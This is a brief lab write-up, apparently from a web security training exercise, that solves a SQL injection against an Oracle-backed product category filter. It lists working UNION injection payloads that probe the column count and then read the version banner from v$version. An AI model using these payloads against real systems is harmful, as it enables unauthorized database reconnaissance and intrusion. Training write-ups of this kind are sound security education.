# Lab 03 :  SQL injection attack, querying the database type and version on Oracle

## Overview:
- Level : PRACTITIONER
- SQL Injection on product category filter
- Union attack
- End Goal : Display the database version string

## Analysis:
- the webpage show sql error that give information about backend sql software is Oracle Database 11g 
- so we know that oracle is there 
- put ' as product category it give 500 internal server error

## Solution:
- On Oracle databases, every SELECT statement must specify a table to select FROM.
- determine number of column
    'UNION SELECT 'abc' FROM dual-- gives 500 internal server error
    'UNION SELECT 'abc','def' FROM dual-- gives 200 ok responce
    so there are two column
- to get database type and version on oracle use following payload
    'UNION SELECT BANNER,NULL FROM v$version--


